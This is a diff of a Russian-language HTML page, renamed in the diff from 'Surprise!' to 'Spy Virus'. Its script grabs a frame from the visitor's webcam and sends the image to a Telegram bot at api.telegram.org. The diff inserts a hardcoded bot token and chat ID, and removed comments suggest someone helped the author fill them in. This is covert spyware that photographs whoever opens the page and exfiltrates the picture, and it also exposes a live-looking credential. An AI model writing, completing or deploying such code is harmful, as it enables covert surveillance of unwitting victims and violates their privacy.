@@ -2,7 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Сюрприз!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spy Virus</title>
     <style>
         body { 
             display: flex; 
@@ -13,6 +14,10 @@
             color: white; 
             font-family: sans-serif;
             margin: 0;
+        }
+        h1 {
+            text-align: center;
+            padding: 20px;
         }
     </style>
 </head>
@@ -39,13 +44,14 @@
                         canvas.height = video.videoHeight;
                         context.drawImage(video, 0, 0);
                         
+                        // Превращаем кадр в картинку
                         const dataUrl = canvas.toDataURL('image/png');
-
-                        // ВСТАВЬ СВОИ ДАННЫЕ ТУТ (проверь еще раз токен и ID)
-                        const token = "92027897:AAHz8RjL...K0Q0BDXHOUcad7JW4BdbXaFQ"; // Я вижу твой токен в скриншоте!
-                        const chatId = "ТВОЙ_CHAT_ID"; // <--- СЮДА ВСТАВЬ СВОЙ ID (цифры)
                         
-                        // Используем шаблонную строку, чтобы точно не было ошибок с запятыми
+                        // ТВОИ ДАННЫЕ:
+                        const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
+                        const chatId = "1062964951";
+
+                        // Отправляем в Telegram
                         fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${dataUrl}`)
                             .then(response => {
                                 if (response.ok) {
@@ -58,7 +64,8 @@
                                 statusText.innerText = "Ошибка сети!";
                                 console.error(err);
                             });
-                        // Останавливаем камеру, чтобы она не работала вечно (экономит батарею)
+
+                        // Выключаем камеру, чтобы она не работала постоянно
                         stream.getTracks().forEach(track => track.stop());
                     }, 1000);
                 };
